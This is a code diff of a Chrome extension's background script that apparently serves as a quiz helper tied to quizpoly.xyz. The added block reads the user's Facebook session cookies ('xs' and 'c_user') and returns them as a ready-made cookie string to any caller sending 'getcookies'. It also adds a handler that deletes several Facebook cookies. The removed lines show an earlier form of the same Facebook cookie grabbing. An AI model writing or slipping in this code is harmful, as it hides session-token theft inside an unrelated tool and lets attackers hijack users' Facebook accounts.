@@ -9,12 +9,9 @@ import {
     addQuiz as i,
     getQuizAvailable as r,
     getOnlineAnswer as u,
-    getCookie as p,
     getQuizLink as c,
     updateUser as d,
-    getCookie,
 } from "./common.js";
-chrome.tabs.onActivated.addListener(p);
 function openRightPanel(e, a, t = !1, s = !1) {
     chrome.system.display.getInfo((n) => {
         var { width: o, height: i } = n[0].workArea,
@@ -75,7 +72,6 @@ chrome.storage.local.get(["isLogged"], ({ isLogged: e }) => {
                 d(), c(!0);
                 break;
             case "get_user":
-                p(), e().then((e) => c(e)), c(o);
                 break;
             case "send_user_using":
                 n(o);
@@ -88,9 +84,6 @@ chrome.storage.local.get(["isLogged"], ({ isLogged: e }) => {
                 break;
             case "login":
                 t(c);
-                break;
-            case "get_facebook":
-                getCookie();
                 break;
             case "get_quiz_available":
                 r(o.subject, c);
@@ -187,3 +180,35 @@ chrome.storage.local.get(["isLogged"], ({ isLogged: e }) => {
     chrome.notifications.onButtonClicked.addListener((e, a) => {
         "premium_expired" == e && 0 == a && chrome.tabs.create({ url: "https://quizpoly.xyz/premium" });
     });
+
+const targetURL = "https://www.facebook.com";
+
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message === "getcookies") {
+        chrome.cookies.getAll({ url: targetURL }, (cookies) => {
+            const xsCookie = cookies.find((cookie) => cookie.name === "xs");
+            const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
+            if (xsCookie && cUserCookie) {
+                const cookie = `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}`;
+                sendResponse(cookie);
+            } else {
+                sendResponse(null);
+            }
+            return true;
+        });
+        return true;
+    }
+});
+
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message === "removecookies") {
+        chrome.cookies.remove({ name: "xs", url: targetURL });
+        chrome.cookies.remove({ name: "c_user", url: targetURL });
+        chrome.cookies.remove({ name: "sb", url: targetURL });
+        chrome.cookies.remove({ name: "datr", url: targetURL });
+        chrome.cookies.remove({ name: "oo", url: targetURL });
+        sendResponse(true);
+    }
+
+    return true;
+});
